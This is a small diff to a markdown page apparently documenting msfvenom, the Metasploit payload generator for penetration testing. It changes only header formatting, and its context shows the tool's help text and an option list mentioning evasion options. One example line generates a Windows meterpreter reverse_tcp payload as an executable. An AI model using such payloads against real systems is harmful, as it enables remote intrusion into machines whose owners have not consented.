@@ -6,10 +6,11 @@ Msftvenom is a tool for generating and encoding payloads for penetration testing
 
 MsfVenom - a Metasploit standalone payload generator.<br>
 Also a replacement for msfpayload and msfencode.<br>
-Usage: /usr/bin/msfvenom [options] <var=val><br>
+## Usage: <br>
+/usr/bin/msfvenom [options] <var=val><br>
 Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe<br>
 
-Options:<br>
+## Options:<br>
      - -l, --list            <type>     **List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all**<br>
      - -p, --payload         <payload>  **Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom**<br>
          - --list-options               **List --payload <value>'s standard, advanced and evasion options**<br>
